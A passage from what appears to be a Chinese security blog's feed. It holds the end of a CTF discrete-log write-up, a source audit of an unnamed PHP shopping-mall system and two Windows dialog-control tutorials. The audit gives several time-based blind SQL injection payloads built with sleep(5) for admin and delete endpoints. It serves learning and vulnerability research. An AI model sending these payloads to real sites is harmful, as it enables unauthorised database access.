class="hljs-built_in">str</span>(m))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c = &#x27;</span> + <span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-comment"># m = 73964803637492582853353338913523546944627084372081477892312545091623069227301</span><br><span class="hljs-comment"># c = 21572244511100216966799370397791432119463715616349800194229377843045443048821</span><br></code></pre></td></tr></table></figure><blockquote><p>开始啥都不会<br>先通过找师傅帮忙 给出了 解密的脚本</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">m = <span class="hljs-number">73964803637492582853353338913523546944627084372081477892312545091623069227301</span><br>c = <span class="hljs-number">21572244511100216966799370397791432119463715616349800194229377843045443048821</span><br>n = <span class="hljs-number">2</span> ** <span class="hljs-number">256</span><br><span class="hljs-keyword">import</span> sympy<br>flag=sympy.discrete_log(n,c,m)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(flag))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(flag)[<span class="hljs-number">2</span>:])<br><span class="hljs-built_in">print</span>(binascii.unhexlify(<span class="hljs-built_in">hex</span>(flag)[<span class="hljs-number">2</span>:]))<span class="hljs-comment">#将答案的十六进制转出来就行</span><br><span class="hljs-built_in">print</span>(binascii.hexlify(<span class="hljs-string">b&#x27;flag&#123;DASCTF_zjut&#125;&#x27;</span>))<br></code></pre></td></tr></table></figure><p><strong>运行结果</strong><br><img src="https://img-blog.csdnimg.cn/7b575ce40d2f4078b67d85f21c9d917b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6Zu26Zu25p-SYw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><blockquote><p>先分析题目</p></blockquote><blockquote><p>主要的地方在</p></blockquote><blockquote><p>c = pow(m, flaglong, n) 这一段代码<br>这段代码可以看出只有flaglong是我们不知道的<br>所以就需要反解出flaglong<br>c = pow(x,y,z)：这个是表示x的y次幂后除以z的余数。<br>所以要求y  就相当于求flaglong<br>根据师傅的帮助  这道题就可以转化为</p></blockquote><p><img src="https://img-blog.csdnimg.cn/620b24eab6f1472585520d8e04193dfc.png" alt="在这里插入图片描述"></p><blockquote><p>求满足m的flag次方等于c对模n取同余<br>“≡”是数论中表示同余的符号<br><strong>discrete_log</strong>这个函数就是用来求这种类型的<br>discrete_log(x,y,z),x是模数，y是余数，z是底数<br>sympy.discrete_log(n,c,m) 就相对于上面的c = pow(m, flaglong, n)<br>c是余数 m是底数 n是模数</p></blockquote><blockquote><p>**flag=sympy.discrete_log(n,c,m)**这样解出来的flag就是flaglong 是十进制数 因为开始是通过bytes_to_long函数转化的  所以要转化为字符</p></blockquote><blockquote><p>十进制转化为字符  要先转化为16进制  然后转化为字符<br>所以用hex先转化为16进制   然后截取掉 进制标志位<br>然后在通过binascii.unhexlify()函数转化为字符  </p></blockquote><blockquote><p>也可通过在线的进制转化</p><p><img src="https://img-blog.csdnimg.cn/3d0971c9e4f84f2b8560270026f42021.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6Zu26Zu25p-SYw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p></blockquote><p><img src="https://img-blog.csdnimg.cn/662ce69503f54e25b8c6dbf5918872cf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6Zu26Zu25p-SYw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><blockquote><p>最后也可以通过Crypto 库的另一个函数直接转化flag字符</p></blockquote><p><img src="https://img-blog.csdnimg.cn/be66a0bf3bbb4eee8c7a7c3c162e2f3f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6Zu26Zu25p-SYw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><blockquote><p>但是这里我本地不知道什么原因用不起Crypto  就没有在本地复现了</p></blockquote><p>成功解出flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某商城代码审计</title>
    <link href="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="审计开始"><a href="#审计开始" class="headerlink" title="审计开始"></a>审计开始</h2><h3 id="第一处"><a href="#第一处" class="headerlink" title="第一处"></a>第一处</h3><blockquote><p>先来到admin.php页面 先不登录</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" alt="1"></p><blockquote><p>查看源码</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png" alt="2"></p><blockquote><p>admin.php 页面require()引入了一个common.php页面<br>require()是php的内置函数，作用是引入或者包含外部php文件。<br>工作原理：当本身php文件被执行时，则外部文件的内容就将被包含进该自身php文件中；当包含的外部文件发生错误时，系统将抛出错误提示，并且停止php文件的执行。<br>注意：使用require时，一个文件存在错误的话，那么程序就会中断执行了，并显示致命错误 。<br>然后接着往后面看</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png" alt="3"></p><blockquote><p>这里发现一个sql语句 看起来是没有什么防护的 可能有突破 忘前面看 寻找$m</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4.png" alt="4"></p><blockquote><p>在28行和29行发现$m 有两种发送赋值 一种是通过file_get_contents函数 另一种是 如果$m是空的话 就自动赋默认值 默认值没什么看的 我们不能控制 我们看看这个file_get_contents函数<br>file_get_contents() 函数把整个文件读入一个字符串中。<br>然后在file_get_contents函数内部发现了php://input 输入流<br>php://input可以读取没有处理过的POST数据<br>所以这里就导致了 post数据可控<br>然后继续往下看</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png" alt="5"></p><blockquote><p>$m会调用一个Dec函数 我们跟进这个函数</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png" alt="6"></p><blockquote><p>这个函数使用了json_decode函数 json_decode — 对 JSON 格式的字符串进行编码</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7.png" alt="7"></p><blockquote><p>说明 输入流传入的数据需要json格式 然后继续往后看 return会判断$c的值 false的话 就直接把解码后的json数据返回出去 但是前面代码调用的时候传入的true 所以会返回一个函数Rpl 继续跟进这个函数</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/8.png" alt="8"></p><blockquote><p>这个函数用到了foreach is_array is_string 等函数<br>Foreach函数是用来遍历数组的</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/9.png" alt="9"></p><blockquote><p>Is_array函数是判断变量是否为数组<br>Is_string 同理 判断是否为字符串</p></blockquote><blockquote><p>所以这个函数的大概意思就是 将解码后的json数据 通过foreach遍历为键值的形式 值为数组的话则递归调用 判断是否为数组 直到为字符串 才进入下一个判断 在下一个elseif里面 这通过str_replace 进行过滤 经过ascii码值 过滤掉 / * ‘ “ % 空格 然后返回过滤后的数据</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/10.png" alt="10"></p><blockquote><p>然后回到admin.php页面 32行 判断$m[‘act’]的值是否为idx和lgn 因为用的&amp;&amp; 所以只要同时不等于两个 就会进入if 执行sql 又因为前面过滤掉的字符对sql语句影响不大 直接构造语句</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/11.png" alt="11"></p><blockquote><p>来到admin.php页面然后刷新抓包</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/12.png" alt="12"></p><blockquote><p>然后改变请求方式</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/13.png" alt="13"></p><blockquote><p>构造</p><p><em>payload: {“act”:”ttt”,”uid”:”123||sleep(5)”} 延时5秒</em><br><em>因为没有回显位 尝试盲注</em></p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/14.png" alt="14"></p><blockquote><p>也是可以的 后面盲注就不继续测试了</p></blockquote><h3 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h3><blockquote><p>通过审计工具发现一处可能存在注入的地方</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/15.png" alt="15"></p><blockquote><p>然后跟进</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/16.png" alt="16"></p><blockquote><p>发现是在会员保存的地方 属于需要进入后台<br>我们先登入后台 来到会员保存的地方</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/17.png" alt="17"></p><blockquote><p>然后点击保存抓包</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/18.png" alt="18"></p><blockquote><p>然后通过代码分析</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/19.png" alt="19"></p><blockquote><p>要$m[‘ID’]的值乘1不为0 才会进入else 所以进行改包</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/20.png" alt="20"></p><blockquote><p>下面这个if是通过$m[‘Nm’]判断名字是否重复 如果重复的话就终止后续执行了 所以名字随便也改一下<br>然后来到第二个if 里面有sql语句</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/21.png" alt="21"></p><blockquote><p>只看到这个ID这个位置 后面先不看 这里没有过滤 等操作 也没有单引号 直接构造</p><p><em>payload：{“act”:”suv”,”uid”:”1”,”sid”:”zC1fEUcZ0CZAHAde”,”ID”:”1||sleep(5)”,”Nm”:”12653”,”Nc”:”123”,”Np”:”123”,”Ne”:0,”Nv”:0}</em></p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/22.png" alt="22"></p><blockquote><p>延时注入一枚</p></blockquote><h3 id="第三处"><a href="#第三处" class="headerlink" title="第三处"></a>第三处</h3><blockquote><p>通过审计工具找到员工删除这里</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/23.png" alt="23"></p><blockquote><p>员工删除的地方 没有单引号等保护或者过滤<br>直接先来到员工管理页面</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/24.png" alt="24"></p><blockquote><p>因为是本地搭建的原因 有些无法显示 但不影响 我们操作 因为删除 和添加 也只是参数不一样嘛 直接先添加员工 然后抓包</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/25.png" alt="25"></p><blockquote><p>Sav是员工保存的包 我们把它改为sad</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/26.png" alt="26"></p><blockquote><p>然后因为这里没有防护 直接构造</p><p><em>payload：{“act”:”sad”,”uid”:”1”,”sid”:”zC1fEUcZ0CZAHAde”,”ID”:0||sleep(5),”Nm”:”123”,”Np”:”123”,”Nr”:””}</em></p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/27.png" alt="27"></p><blockquote><p>放包 但是发现报错了 不要紧 我们全局搜索下这个报错</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/28.png" alt="28"></p><blockquote><p>发现是在json解码的时候报错了 回来在看数据包 发现没有添加引号 所以报错了 我们加上在试试</p></blockquote><blockquote><p>Payload：{“act”:”sad”,”uid”:”1”,”sid”:”zC1fEUcZ0CZAHAde”,”ID”:”0||sleep(5)”,”Nm”:”123”,”Np”:”123”,”Nr”:””}</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/29.png" alt="29"></p><blockquote><p>成功延时</p></blockquote><h3 id="第四处"><a href="#第四处" class="headerlink" title="第四处"></a>第四处</h3><blockquote><p>找到一个运费删除的地方  和上面的差不多 都是通过case 判断进入</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/30.png" alt="30"></p><blockquote><p>这里和上面同理 直接改掉act的值为syd<br>然后放包</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/31.png" alt="31"></p><blockquote><p>延时成功<br>后续还有优惠删除等 删除的操作 都有这个问题 没有给单引号保护以及过滤 都可以延时注入</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows编程通用控件</title>
    <link href="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/"/>
    <url>/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/1.png" alt="1"></p><blockquote><p>进度条和滑块控件</p></blockquote><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/2.png" alt="2"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/3.png" alt="3"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/4.png" alt="4"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/5.png" alt="5"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/6.png" alt="6"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/7.png" alt="7"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/8.png" alt="8"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/9.png" alt="9"></p><blockquote><p>运行</p></blockquote><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/10.png" alt="10"></p><blockquote><p>用滑块控制进度条</p></blockquote><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/11.png" alt="11"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/12.png" alt="12"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/13.png" alt="13"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/14.png" alt="14"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/15.png" alt="15"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;resource.h&quot;</span></span><br><span class="hljs-function">INT_PTR CALLBACK <span class="hljs-title">Dlgproc</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">UINT uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_INITDIALOG:<br>&#123;<br><span class="hljs-built_in">SendDlgItemMessageW</span>(hwnd, IDC_PROGRESS1,PBM_SETRANGE,<span class="hljs-number">0</span>,<span class="hljs-built_in">MAKELPARAM</span>(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>));<br><span class="hljs-built_in">SendDlgItemMessageW</span>(hwnd, IDC_SLIDER1, TBM_SETRANGE, TRUE, <span class="hljs-built_in">MAKELPARAM</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>));<br><span class="hljs-built_in">SendDlgItemMessageW</span>(hwnd, IDC_PROGRESS1, PBM_SETPOS, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">SendDlgItemMessageW</span>(hwnd, IDC_SLIDER1, TBM_SETPOS, TRUE, <span class="hljs-number">80</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br>&#123;<br><span class="hljs-built_in">EndDialog</span>(hwnd, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">case</span> WM_HSCROLL:<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetDlgItem</span>(hwnd, IDC_SLIDER1)==(HWND)lParam)<br>&#123;<br><span class="hljs-keyword">int</span> pos = <span class="hljs-built_in">SendMessageW</span>((HWND)lParam,TBM_GETPOS,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br><span class="hljs-built_in">SendDlgItemMessageW</span>(hwnd, IDC_PROGRESS1,PBM_SETPOS,pos,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPrevInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR     lpCmdLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span>       nShowCmd</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">DialogBoxW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDD_DIALOG1),<span class="hljs-literal">NULL</span>, Dlgproc);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows编程控件的使用</title>
    <link href="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="控件的使用"><a href="#控件的使用" class="headerlink" title="控件的使用"></a>控件的使用</h2><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/1.png" alt="1"></p><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/2.png" alt="2"></p><blockquote><p>复选框和单选框的创建</p></blockquote><blockquote><p><strong>DialogBoxW 用这个函数创建对话框</strong></p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/3.png" alt="3"></p><blockquote><p>标题可以通过这样修改标题</p></blockquote><blockquote><p>然后添加几个多选框和点选框</p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/4.png" alt="4"></p><blockquote><p>直接ctrl+D  可以看见都是标了序号的 然后看见这个单选框</p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/5.png" alt="5"></p><blockquote><p>随便选一个右键属性</p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/6.png" alt="6"></p><blockquote><p>有一个组的属性  值是FALSE   这几个单选框的组属性都是false  所以目前这几个都是一组的  但是如果把喜欢 和不确定改为 true之后   </p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/7.png" alt="7"></p><blockquote><p>不确定和上面的就不是一组的了    从喜欢往下数   直到遇到一个为true的 才分为另一组  </p></blockquote><blockquote><p>在启动的时候默认选择一个多选框</p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/8.png" alt="8"></p><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/9.png" alt="9"></p><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/10.png" alt="10"></p><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/11.png" alt="11"></p><blockquote><p>这个函数可以直接代替上面两行</p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/12.png" alt="12"></p><blockquote><p>获取选中的状态</p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/13.png" alt="13"></p><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/14.png" alt="14"></p><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/15.png" alt="15"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;resource.h&quot;</span></span><br><br><span class="hljs-function">INT_PTR CALLBACK <span class="hljs-title">Dlgproc</span><span 